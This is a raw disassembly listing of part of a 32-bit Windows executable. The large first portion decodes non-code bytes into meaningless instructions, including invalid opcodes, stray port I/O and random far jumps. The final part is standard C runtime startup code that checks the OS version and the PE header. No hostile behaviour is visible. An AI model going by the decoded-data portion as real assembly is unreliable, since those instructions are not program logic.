  423d87:	jnp    0x423d4d
  423d89:	inc    ebp
  423d8a:	mov    edx,0xf6967a11
  423d8f:	clc    
  423d90:	xchg   BYTE PTR ds:0x52c2200a,cl
  423d96:	repz lea ebp,[edx]
  423d99:	das    
  423d9a:	push   ecx
  423d9b:	mov    ah,0x4b
  423d9d:	jb     0x423d2f
  423d9f:	adc    al,0x8b
  423da1:	fidivr DWORD PTR [ecx+0x32f44757]
  423da7:	pop    ecx
  423da8:	lahf   
  423da9:	lock rcl BYTE PTR [eax+0x5f],1
  423dad:	mul    BYTE PTR [edx+0x3f]
  423db0:	(bad)  
  423db1:	dec    ebx
  423db2:	push   ds
  423db3:	lods   al,BYTE PTR ds:[esi]
  423db4:	mov    al,0x80
  423db6:	xor    ebp,DWORD PTR [ecx-0x37]
  423db9:	mov    DWORD PTR [edx-0x73cae24f],esi
  423dbf:	inc    edi
  423dc0:	into   
  423dc1:	sub    bh,dl
  423dc3:	cmp    eax,0x31af4ce3
  423dc8:	or     DWORD PTR [ebx+0x30655810],ebx
  423dce:	push   es
  423dcf:	test   eax,0xdc0c6e2
  423dd4:	xor    BYTE PTR [edi-0x5f],bh
  423dd7:	shl    DWORD PTR [esp+edi*2+0x6d78ec6e],cl
  423dde:	cmp    ah,BYTE PTR [edi-0xa]
  423de1:	out    0x6e,eax
  423de3:	jne    0x423e3a
  423de5:	jae    0x423de2
  423de7:	daa    
  423de8:	pop    esi
  423de9:	jge    0x423e3d
  423deb:	addr16 jl 0x423d74
  423dee:	imul   eax,DWORD PTR [ebx],0x54655855
  423df4:	pop    edi
  423df5:	sar    DWORD PTR [edx-0x3c],1
  423df8:	sbb    cl,BYTE PTR [esi-0x63eccfc]
  423dfe:	sub    al,0x3b
  423e00:	data16 aas 
  423e02:	dec    edi
  423e03:	jge    0x423e0b
  423e05:	fs popa 
  423e07:	neg    DWORD PTR [edx]
  423e09:	dec    esp
  423e0a:	(bad)  
  423e0b:	fadd   st(4),st
  423e0d:	push   ss
  423e0e:	xor    BYTE PTR [esi],cl
  423e10:	(bad)  
  423e11:	enter  0x7053,0xff
  423e15:	dec    ecx
  423e16:	rcl    DWORD PTR [eax],1
  423e18:	daa    
  423e19:	rol    BYTE PTR [edi-0x4afc5d2a],1
  423e1f:	loopne 0x423e55
  423e21:	pop    ebx
  423e22:	fadd   DWORD PTR [esi-0x163d0162]
  423e28:	adc    edi,esp
  423e2a:	adc    eax,0xc7819167
  423e2f:	add    eax,0x2b549c58
  423e34:	mov    ah,bl
  423e36:	xchg   esp,eax
  423e37:	loopne 0x423e10
  423e39:	lods   al,BYTE PTR ds:[esi]
  423e3a:	aam    0xbc
  423e3c:	and    eax,0xb46f658e
  423e41:	sub    eax,DWORD PTR [edi]
  423e43:	sbb    dh,al
  423e45:	retf   
  423e46:	jle    0x423e21
  423e48:	push   ss
  423e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e4a:	rol    cl,cl
  423e4c:	aad    0x68
  423e4e:	dec    ebx
  423e4f:	(bad)  
  423e50:	mov    edx,0x3cca1fe5
  423e55:	ds add eax,0xf90ad13f
  423e5b:	shl    ch,cl
  423e5d:	cmp    al,0x2d
  423e5f:	mov    bl,0xa
  423e61:	fcomp  QWORD PTR ss:[esi-0x3cc96273]
  423e68:	nop
  423e69:	sub    eax,0x21bd2c2b
  423e6e:	jno    0x423e20
  423e70:	and    al,0x94
  423e72:	lds    esi,FWORD PTR ds:0x1342085f
  423e78:	mov    WORD PTR [ebx],cs
  423e7a:	cdq    
  423e7b:	adc    al,0xf2
  423e7d:	neg    DWORD PTR [esi]
  423e7f:	push   cs
  423e80:	leave  
  423e81:	jnp    0x423e60
  423e83:	aaa    
  423e84:	daa    
  423e85:	loope  0x423e48
  423e87:	cmp    ch,dh
  423e89:	icebp  
  423e8a:	mov    ecx,0x91d696ba
  423e8f:	inc    esp
  423e90:	jb     0x423e58
  423e92:	xor    cl,BYTE PTR [ebx+0x5610c7ea]
  423e98:	adc    cl,BYTE PTR [edx+0x6494e671]
  423e9e:	fwait
  423e9f:	lds    esp,FWORD PTR [edx+0x68]
  423ea2:	xchg   esp,eax
  423ea3:	je     0x423e38
  423ea5:	and    eax,0x1df1d710
  423eaa:	cmc    
  423eab:	push   cs
  423eac:	inc    esi
  423ead:	push   ebp
  423eae:	dec    ebp
  423eaf:	cmp    al,0x73
  423eb1:	push   es
  423eb2:	stc    
  423eb3:	fnstsw WORD PTR [eax-0x68db2c6e]
  423eb9:	jb     0x423e91
  423ebb:	bound  eax,QWORD PTR [ecx+0x14]
  423ebe:	mov    ah,0x6a
  423ec0:	adc    BYTE PTR [eax-0x6945143e],dl
  423ec6:	sbb    eax,0x23058e06
  423ecb:	xchg   ebp,eax
  423ecc:	repnz loopne 0x423f34
  423ecf:	jb     0x423eed
  423ed1:	xchg   DWORD PTR [esi],eax
  423ed3:	loop   0x423f44
  423ed5:	repz sub ecx,DWORD PTR [ebp-0x2d]
  423ed9:	jo     0x423f03
  423edb:	arpl   di,di
  423edd:	xor    cl,0x9e
  423ee0:	daa    
  423ee1:	mov    ebp,0x17341c34
  423ee6:	xchg   ebx,eax
  423ee7:	mov    ebp,0xaf13db66
  423eec:	cmp    eax,0x98b77a73
  423ef1:	cmp    dh,BYTE PTR [ecx+0x1c81af13]
  423ef7:	popf   
  423ef8:	inc    ebp
  423ef9:	mov    dh,0xdd
  423efb:	xchg   esp,eax
  423efc:	cwde   
  423efd:	fdivr  DWORD PTR ds:0x8413824d
  423f03:	pop    ecx
  423f04:	lds    ecx,FWORD PTR [ecx+0x6be568ce]
  423f0a:	cld    
  423f0b:	into   
  423f0c:	push   0xffffff91
  423f0e:	mov    esp,0x94f517d
  423f13:	(bad)  [edi]
  423f15:	pop    ecx
  423f16:	pop    edx
  423f17:	mov    cl,BYTE PTR ds:0xb3022830
  423f1d:	aaa    
  423f1e:	int    0xbc
  423f20:	or     eax,0x59975b06
  423f25:	jnp    0x423f4e
  423f27:	xchg   edi,eax
  423f28:	test   BYTE PTR ds:0x27796302,ah
  423f2e:	jl     0x423fa0
  423f30:	xchg   ecx,eax
  423f31:	jecxz  0x423f7f
  423f33:	enter  0xe9de,0xf4
  423f37:	repz ret 
  423f39:	add    al,0xcf
  423f3b:	dec    ecx
  423f3c:	cmc    
  423f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f3e:	iret   
  423f3f:	fxch   st(3)
  423f41:	inc    edx
  423f42:	in     eax,dx
  423f43:	xchg   edi,eax
  423f44:	add    eax,ecx
  423f46:	fsubr  QWORD PTR [ecx+0x2]
  423f49:	sub    cl,BYTE PTR [ebx+edx*8+0x7e]
  423f4d:	lods   eax,DWORD PTR ds:[esi]
  423f4e:	or     DWORD PTR [ecx+0xd],ebx
  423f51:	jp     0x423f83
  423f53:	gs push 0xfffffff7
  423f56:	outs   dx,BYTE PTR ds:[esi]
  423f57:	gs mov edx,0xbd726e1f
  423f5d:	sub    al,0x46
  423f5f:	lea    ebx,[ecx-0x7a]
  423f62:	aam    0x87
  423f64:	mov    edx,0x8fc0709e
  423f69:	ss sub al,0x3a
  423f6c:	mov    al,ds:0x9233bf93
  423f71:	icebp  
  423f72:	aam    0x12
  423f74:	shr    BYTE PTR ds:0xdfa32d2c,0xa6
  423f7b:	mov    WORD PTR [esi],ds
  423f7d:	xchg   DWORD PTR [ecx+0x79],esi
  423f80:	and    eax,0x286320d
  423f85:	adc    DWORD PTR [ebx],0xec78f92b
  423f8b:	jne    0x423fa6
  423f8d:	jo     0x423f9c
  423f8f:	dec    ebp
  423f90:	adc    ah,BYTE PTR [eax-0x51bad00d]
  423f96:	aad    0xe9
  423f98:	jle    0x423fc1
  423f9a:	xor    al,0xc1
  423f9c:	call   0xf211:0x4c67c1ff
  423fa3:	fdiv   QWORD PTR [edx+ecx*1-0x65]
  423fa7:	xlat   BYTE PTR ds:[ebx]
  423fa8:	cmp    eax,0x65476d18
  423fad:	dec    edx
  423fae:	ds out 0x43,al
  423fb1:	push   edi
  423fb2:	fild   QWORD PTR [eax-0x37]
  423fb5:	mov    ?,WORD PTR [esi-0x54]
  423fb8:	push   eax
  423fb9:	mov    al,0xdc
  423fbb:	add    eax,0x9427bfb4
  423fc0:	sub    ebp,eax
  423fc2:	push   cs
  423fc3:	gs verr cx
  423fc7:	sahf   
  423fc8:	retf   0x1720
  423fcb:	out    0x6b,eax
  423fcd:	and    ebx,edi
  423fcf:	push   DWORD PTR [ebx]
  423fd1:	sub    al,0xd5
  423fd3:	xchg   edx,eax
  423fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fd5:	mov    ds:0x719aa3b,al
  423fda:	ud0    esi,DWORD PTR [ebx-0x60a3758f]
  423fe1:	push   0xffffffb5
  423fe3:	jnp    0x424004
  423fe5:	shr    DWORD PTR [ebx+ebp*1+0x6dca2362],0xe0
  423fed:	jns    0x42406a
  423fef:	or     eax,0x592e2c5f
  423ff4:	pushf  
  423ff5:	xchg   esi,eax
  423ff6:	cmp    BYTE PTR [edx+0x263e9cff],dl
  423ffc:	mov    ebp,0x77b8eac2
  424001:	fs jle 0x424011
  424004:	repz mov bl,0xc2
  424007:	jno    0x423f8a
  424009:	push   eax
  42400a:	jae    0x42406e
  42400c:	dec    ebp
  42400d:	popf   
  42400e:	xchg   esi,eax
  42400f:	sub    eax,DWORD PTR [ecx-0x4b]
  424012:	sub    al,BYTE PTR [esi+eiz*1+0x42]
  424016:	out    dx,al
  424017:	pop    esi
  424018:	sbb    BYTE PTR [edi-0x49],0xb1
  42401c:	rcl    BYTE PTR [ecx-0xfc705a4],1
  424022:	dec    edi
  424023:	jp     0x42406b
  424025:	ret    
  424026:	(bad)  
  424027:	mov    eax,ds:0x4e1a6976
  42402c:	daa    
  42402d:	outs   dx,DWORD PTR ds:[esi]
  42402e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42402f:	add    DWORD PTR [esi+0x71],ebx
  424032:	adc    bl,BYTE PTR [edi+0x8ab8d74]
  424038:	hlt    
  424039:	sar    BYTE PTR [esi+0xbefe495],1
  42403f:	push   ds
  424040:	jmp    0x228f8075
  424045:	push   ds
  424046:	das    
  424047:	cmp    esi,ecx
  424049:	mov    esi,0xbc4e7f39
  42404e:	dec    esp
  42404f:	scas   al,BYTE PTR es:[edi]
  424050:	repnz mov dh,0xda
  424053:	add    ecx,DWORD PTR [ecx+0x3b]
  424056:	out    dx,al
  424057:	je     0x4240a7
  424059:	jle    0x423fec
  42405b:	mov    ds:0xa163c4a4,al
  424060:	bound  ebx,QWORD PTR [edx+ebx*4-0x2a]
  424064:	push   edx
  424065:	sbb    cl,BYTE PTR [esi]
  424067:	xchg   ecx,eax
  424068:	xchg   ecx,eax
  424069:	test   al,0x27
  42406b:	and    cl,BYTE PTR [esi+0x15]
  42406e:	clc    
  42406f:	push   0x3cc150da
  424074:	inc    ebp
  424075:	out    dx,eax
  424076:	popf   
  424077:	pop    es
  424078:	xchg   ah,bh
  42407a:	adc    dl,BYTE PTR [esi+0x5057e6d]
  424080:	mov    esp,0xa5ed3520
  424085:	cmp    edx,esp
  424087:	inc    edi
  424088:	jge    0x42405c
  42408a:	stc    
  42408b:	aad    0xb6
  42408d:	and    dh,cl
  42408f:	loopne 0x4240d8
  424091:	js     0x424050
  424093:	ret    
  424094:	jne    0x424071
  424096:	imul   eax,DWORD PTR [ebx+0x13],0x3a7fc6c7
  42409d:	data16 sub BYTE PTR [ebx+0x61846d90],cl
  4240a4:	mov    eax,0x15c57cde
  4240a9:	aas    
  4240aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ab:	(bad)  
  4240ad:	inc    ebp
  4240ae:	rcr    dl,cl
  4240b0:	pop    edx
  4240b1:	stos   DWORD PTR es:[edi],eax
  4240b2:	push   ebx
  4240b3:	sahf   
  4240b4:	fiadd  DWORD PTR [edx+0x54947384]
  4240ba:	std    
  4240bb:	test   eax,0x1649cc51
  4240c0:	add    cl,BYTE PTR [ebx+ebp*1-0x70cc8c8f]
  4240c7:	xor    eax,0xa9d6a045
  4240cc:	cmp    dh,BYTE PTR [edi-0x2c]
  4240cf:	jmp    0x7d94:0xd79fb1ce
  4240d6:	adc    DWORD PTR ds:0x95125117,0xffffff95
  4240dd:	sar    BYTE PTR [ebx],cl
  4240df:	jmp    0xa196:0xba3331
  4240e6:	push   0x156941fa
  4240eb:	in     al,0x14
  4240ed:	mov    esp,0x4ca451a
  4240f2:	add    al,0xbe
  4240f4:	test   al,0x47
  4240f6:	sbb    ebx,ebx
  4240f8:	add    BYTE PTR [edi],dl
  4240fa:	mov    ebp,0xafdad47c
  4240ff:	xchg   BYTE PTR [ebx-0x400d79b2],bh
  424105:	imul   edx,DWORD PTR [ebp-0x6a7bc216],0xfffffff1
  42410c:	mov    ebx,ecx
  42410e:	imul   BYTE PTR [eax]
  424110:	mov    bl,0x65
  424112:	inc    esp
  424113:	push   esp
  424114:	xchg   ebx,eax
  424115:	aaa    
  424116:	cmp    eax,0x250c6211
  42411b:	xchg   cl,dh
  42411d:	mov    edi,0xc66cfaec
  424122:	call   0x52fd:0x3869502f
  424129:	js     0x42412f
  42412b:	int3   
  42412c:	or     eax,0xa7912cb9
  424131:	jmp    0x4240ef
  424133:	push   edi
  424134:	loop   0x424175
  424136:	imul   ecx,DWORD PTR [esi],0x5d
  424139:	mov    bl,0x30
  42413b:	(bad)  
  42413c:	push   edx
  42413d:	mov    al,0x7f
  42413f:	jno    0x424182
  424141:	jo     0x4240e0
  424143:	sub    BYTE PTR [edx+0x42cfe257],bl
  424149:	xor    ah,BYTE PTR [ebx]
  42414b:	je     0x42417e
  42414d:	es mov ah,0x78
  424150:	push   ecx
  424151:	add    bh,ah
  424153:	call   0xa0db3a3b
  424158:	out    0xe4,al
  42415a:	js     0x424146
  42415c:	adc    eax,0xd7515e44
  424161:	mov    BYTE PTR [edx],dl
  424163:	vshufps xmm6,xmm7,XMMWORD PTR [ecx],0x55
  424168:	xchg   edi,eax
  424169:	xchg   ebp,eax
  42416a:	sbb    DWORD PTR [eax-0x526f4743],ebp
  424170:	into   
  424171:	fstp   TBYTE PTR [ebp-0x23c02310]
  424177:	mov    dh,0xba
  424179:	in     al,0x1f
  42417b:	test   al,0xfd
  42417d:	call   0x81d84323
  424182:	adc    BYTE PTR [edi-0x60],al
  424185:	mov    bl,0x11
  424187:	or     ebx,ebx
  424189:	(bad)  
  42418a:	and    ah,BYTE PTR [ebx-0x8]
  42418d:	jmp    0x42416f
  42418f:	jmp    0x4241aa
  424191:	je     0x4241f2
  424193:	(bad)  
  424194:	cld    
  424195:	inc    ecx
  424196:	add    eax,0x4f3fd81
  42419b:	push   eax
  42419c:	iret   
  42419d:	ja     0x42414a
  42419f:	jo     0x4241c8
  4241a1:	and    eax,0xfed5f37e
  4241a6:	cli    
  4241a7:	fcmovb st,st(1)
  4241a9:	adc    edx,DWORD PTR [ebp+edx*2+0x288d2c6d]
  4241b0:	mov    dh,0xf8
  4241b2:	and    dh,BYTE PTR [edi]
  4241b4:	mov    DWORD PTR [edi-0x6a2673a4],eax
  4241ba:	mov    esi,0x42f934c2
  4241bf:	add    BYTE PTR [esi+edx*4-0x640135f],bh
  4241c6:	mov    edi,0x13641b74
  4241cb:	push   edx
  4241cc:	in     al,0x78
  4241ce:	sub    eax,0x61278257
  4241d3:	fstp   QWORD PTR [edi+0x74158b8f]
  4241d9:	(bad)  
  4241da:	mov    ebx,0xe4ae3024
  4241df:	push   ebx
  4241e0:	xchg   ebx,eax
  4241e1:	inc    ebp
  4241e2:	mov    ebx,edx
  4241e4:	inc    edx
  4241e5:	pushf  
  4241e6:	xor    eax,0x9924a02e
  4241eb:	xor    bl,BYTE PTR [edi]
  4241ed:	push   ss
  4241ee:	or     DWORD PTR [ecx],eax
  4241f0:	or     BYTE PTR [eax-0x4eb4c0d6],dl
  4241f6:	stos   DWORD PTR es:[edi],eax
  4241f7:	sbb    al,0x94
  4241f9:	pop    esp
  4241fa:	and    ch,bl
  4241fc:	xor    DWORD PTR [edx],esp
  4241fe:	scas   al,BYTE PTR es:[edi]
  4241ff:	out    dx,al
  424200:	stos   DWORD PTR es:[edi],eax
  424201:	in     eax,0xb9
  424203:	inc    ecx
  424204:	gs add al,0x50
  424207:	shl    DWORD PTR [edi+0x2b],cl
  42420a:	mov    bh,BYTE PTR [esi-0x1a21cf92]
  424210:	mov    ebp,0xad6d1054
  424215:	or     BYTE PTR [esi+0x2347a64a],al
  42421b:	cdq    
  42421c:	mov    dh,0x9
  42421e:	pop    ecx
  42421f:	inc    esi
  424220:	ficomp WORD PTR [edx+0x25]
  424223:	jnp    0x4241f3
  424225:	cmc    
  424226:	(bad)  
  424228:	bound  ebp,QWORD PTR [ebx]
  42422a:	iret   
  42422b:	xchg   esi,eax
  42422c:	fistp  DWORD PTR [eax+0x3df99062]
  424232:	ins    DWORD PTR es:[edi],dx
  424233:	and    BYTE PTR [ebp+0x1a],al
  424236:	dec    edi
  424237:	ficom  WORD PTR [edx-0x40]
  42423a:	cmp    edi,DWORD PTR [ebx]
  42423c:	daa    
  42423d:	inc    edx
  42423e:	mov    ebp,0x31bfdc31
  424243:	mov    DWORD PTR [edi+ebx*2],ebp
  424246:	test   BYTE PTR [esi+0x43],dl
  424249:	repz dec esi
  42424b:	push   es
  42424c:	out    dx,eax
  42424d:	enter  0xb0c7,0xde
  424251:	inc    ebp
  424252:	ins    DWORD PTR es:[edi],dx
  424253:	mov    edi,0x6a37b26c
  424258:	clc    
  424259:	not    DWORD PTR [esi-0x2cceeffd]
  42425f:	mov    dl,0x88
  424261:	mov    dl,0x4a
  424263:	and    BYTE PTR [eax+0x35],dl
  424266:	or     al,0xfb
  424268:	cmp    BYTE PTR [ebx],0xa7
  42426b:	inc    eax
  42426c:	(bad)  
  42426d:	test   bl,0x70
  424270:	das    
  424271:	sbb    dh,ah
  424273:	call   0xf757:0x81bce42
  42427a:	shr    DWORD PTR ds:0xea5a94dc,1
  424280:	inc    edx
  424281:	fwait
  424282:	mov    cl,0x40
  424284:	scas   eax,DWORD PTR es:[edi]
  424285:	jne    0x4242db
  424287:	rcl    dl,cl
  424289:	cs test eax,0xc825485
  42428f:	xchg   DWORD PTR [eax+0x1e],ebx
  424292:	mov    ds:0x33f02f7e,eax
  424297:	test   al,0x88
  424299:	repz int 0x43
  42429c:	lds    ecx,FWORD PTR ds:0x63225939
  4242a2:	popf   
  4242a3:	aaa    
  4242a4:	in     al,dx
  4242a5:	faddp  st(5),st
  4242a7:	jg     0x4242b2
  4242a9:	mov    cl,0x82
  4242ab:	push   edi
  4242ac:	lods   eax,DWORD PTR ds:[esi]
  4242ad:	xor    eax,0x439e01e3
  4242b2:	cli    
  4242b3:	cmp    DWORD PTR [eax+0x1432a181],0x5eff4512
  4242bd:	and    al,dl
  4242bf:	outs   dx,DWORD PTR ds:[esi]
  4242c0:	adc    eax,0x93115ed6
  4242c5:	in     al,0x9b
  4242c7:	les    esi,FWORD PTR [esi+edx*8]
  4242ca:	ret    
  4242cb:	inc    ebp
  4242cc:	pop    ecx
  4242cd:	jle    0x424258
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	sbb    DWORD PTR [edx+edx*4-0x23],esi
  4242d4:	pushf  
  4242d5:	loope  0x424302
  4242d7:	(bad)  
  4242d9:	cdq    
  4242da:	ds popa 
  4242dc:	jae    0x42426c
  4242de:	add    DWORD PTR [ebx+0x59909706],edi
  4242e4:	stos   BYTE PTR es:[edi],al
  4242e5:	mov    eax,ds:0x4eaa5ae2
  4242ea:	out    dx,al
  4242eb:	jge    0x424305
  4242ed:	iret   
  4242ee:	push   ebp
  4242ef:	mov    BYTE PTR [ebp+0x45],ah
  4242f2:	fs push 0x8b75f35c
  4242f8:	aam    0x94
  4242fa:	sbb    BYTE PTR [eax],al
  4242fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242fd:	(bad)  
  4242fe:	sub    bh,BYTE PTR [ecx-0x38]
  424301:	dec    esi
  424302:	dec    eax
  424303:	and    al,BYTE PTR [edx+eax*2+0x3b]
  424307:	jae    0x424375
  424309:	icebp  
  42430a:	cmp    BYTE PTR [ecx],0x67
  42430d:	mov    eax,0xebf684cd
  424312:	push   edi
  424313:	jmp    0x5825:0x2cef8b72
  42431a:	jns    0x424395
  42431c:	jne    0x424319
  42431e:	test   DWORD PTR [edi+0x7d48fdae],esp
  424324:	pop    ebx
  424325:	hlt    
  424326:	sbb    BYTE PTR [ebx],bh
  424328:	fbld   TBYTE PTR [esi+0x57]
  42432b:	gs cwde 
  42432d:	fsub   QWORD PTR [esi+0x3388849a]
  424333:	push   ecx
  424334:	dec    ebx
  424335:	mov    bh,0xa
  424337:	xor    eax,0xd8907da5
  42433c:	or     eax,0xc8a935df
  424341:	sbb    edi,eax
  424343:	jge    0x424382
  424345:	dec    ebx
  424346:	cmp    edi,DWORD PTR ds:0xe8935f0
  42434c:	das    
  42434d:	or     al,0x22
  42434f:	dec    eax
  424350:	and    eax,DWORD PTR cs:0xdd30eb54
  424357:	lock (bad) 
  424359:	sbb    al,0x2a
  42435b:	(bad)  
  42435c:	outs   dx,DWORD PTR ds:[esi]
  42435d:	loope  0x4243d6
  42435f:	mov    ds:0xffb2e3d,al
  424364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424365:	jo     0x424373
  424367:	bound  eax,QWORD PTR [ebx]
  424369:	sub    eax,0xa9757e50
  42436e:	inc    ebx
  42436f:	xchg   edx,eax
  424370:	arpl   dx,bx
  424372:	mov    bh,0xb
  424374:	add    eax,0xa95589ab
  424379:	inc    eax
  42437a:	je     0x424346
  42437c:	xchg   esi,eax
  42437d:	cmp    eax,0xd840e3fe
  424382:	sub    BYTE PTR [edx-0x2b7c53f9],ah
  424388:	div    BYTE PTR [ecx-0x4cf1d560]
  42438e:	pop    eax
  42438f:	std    
  424390:	bnd jnp 0x42440f
  424393:	imul   edi,DWORD PTR [eax+0xe08a82f],0xffffffaa
  42439a:	jecxz  0x42437e
  42439c:	cwde   
  42439d:	ror    WORD PTR [esi],cl
  4243a0:	jge    0x424391
  4243a2:	ss pop ebx
  4243a4:	push   esp
  4243a5:	mov    ds:0xecd90199,eax
  4243aa:	mov    dl,0x82
  4243ac:	jmp    0x40f9:0xb0b8c591
  4243b3:	mov    ss,WORD PTR [ecx-0x37]
  4243b6:	xor    eax,0x692abbf9
  4243bb:	sahf   
  4243bc:	sub    dl,ah
  4243be:	mov    ecx,DWORD PTR [edx]
  4243c0:	imul   ebp,DWORD PTR [esi+0x7a5e879a],0x24
  4243c7:	sbb    al,0xc9
  4243c9:	adc    ah,BYTE PTR [edx]
  4243cb:	add    BYTE PTR [ecx+0x26],0x93
  4243cf:	push   eax
  4243d0:	mov    edi,0xec6b7e05
  4243d5:	aam    0x73
  4243d7:	adc    DWORD PTR [ecx+0x637debd6],ecx
  4243dd:	lods   al,BYTE PTR ds:[esi]
  4243de:	das    
  4243df:	das    
  4243e0:	fld    QWORD PTR [ecx]
  4243e2:	push   eax
  4243e3:	(bad)  
  4243e4:	sbb    eax,0x5c4960c5
  4243e9:	pusha  
  4243ea:	push   esp
  4243eb:	inc    edx
  4243ec:	shl    BYTE PTR [ebx+0x4a],1
  4243ef:	call   0xcbe500a3
  4243f4:	inc    edi
  4243f5:	adc    eax,0x86cb3517
  4243fa:	mov    bl,0xd2
  4243fc:	jo     0x4243df
  4243fe:	dec    DWORD PTR [ebp-0x1c0495e3]
  424404:	mov    edi,0x91d34de8
  424409:	xchg   ebp,eax
  42440a:	jns    0x4243ff
  42440c:	bound  ebx,QWORD PTR [edx]
  42440e:	and    ch,ch
  424410:	enter  0xe84b,0x6a
  424414:	dec    esp
  424415:	ds adc eax,0x97790311
  42441b:	nop
  42441c:	int3   
  42441d:	jp     0x42443d
  42441f:	test   eax,0xcf12b145
  424424:	xchg   esp,eax
  424425:	data16 clc 
  424427:	(bad)  
  424428:	jmp    0xf330:0x20bd0430
  42442f:	aam    0x84
  424431:	lea    edi,[ebx-0x57cdc7d0]
  424437:	(bad)  
  424438:	add    ch,ah
  42443a:	pop    es
  42443b:	ja     0x4244ab
  42443d:	iret   
  42443e:	inc    edi
  42443f:	xchg   esi,eax
  424440:	fistp  DWORD PTR [eax+0x256a4ae8]
  424446:	lds    ebx,FWORD PTR [ebp-0x3db8ddb1]
  42444c:	push   esp
  42444d:	data16 jp 0x4243d4
  424450:	and    edi,DWORD PTR [edi]
  424452:	pop    edi
  424453:	inc    edi
  424454:	std    
  424455:	ret    
  424456:	and    bl,BYTE PTR [edx+0x1a]
  424459:	loopne 0x424461
  42445b:	xor    BYTE PTR [eax],0xff
  42445e:	loope  0x4244d2
  424460:	mov    esi,0x37b8d66f
  424465:	mov    ch,0x18
  424467:	idiv   BYTE PTR [edi-0x29]
  42446a:	cdq    
  42446b:	loopne 0x42448a
  42446d:	repnz adc eax,0xb4752b93
  424473:	fmul   st,st(4)
  424475:	or     dh,BYTE PTR [eax+0xf57026]
  42447b:	dec    eax
  42447c:	in     al,0xf0
  42447e:	inc    edx
  42447f:	mov    cl,0x95
  424481:	not    BYTE PTR [eax-0x24]
  424484:	cmp    cl,BYTE PTR [edx]
  424486:	mov    WORD PTR [edx],gs
  424488:	ins    BYTE PTR es:[edi],dx
  424489:	sub    ah,BYTE PTR [ecx]
  42448b:	imul   edi,DWORD PTR [ebp+0x43fc51b7],0x78156f95
  424495:	mov    edi,0x69b67ae8
  42449a:	pop    esp
  42449b:	in     eax,dx
  42449c:	js     0x4244dd
  42449e:	test   DWORD PTR [ebx*4-0x5178574d],eax
  4244a5:	inc    edx
  4244a6:	jno    0x424526
  4244a8:	xlat   BYTE PTR ds:[ebx]
  4244a9:	ss out 0x5a,al
  4244ac:	jle    0x42449f
  4244ae:	push   esi
  4244af:	xchg   BYTE PTR [esi],dh
  4244b1:	repz push esp
  4244b3:	hlt    
  4244b4:	xchg   edi,eax
  4244b5:	addr16 dec eax
  4244b7:	cmp    eax,0x9fb21ff7
  4244bc:	sbb    al,0xdc
  4244be:	in     eax,dx
  4244bf:	and    ecx,DWORD PTR [edi]
  4244c1:	(bad)  
  4244c2:	mov    esp,0x6a006abd
  4244c7:	add    al,ch
  4244c9:	and    eax,DWORD PTR [eax]
  4244cb:	add    BYTE PTR [eax],al
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
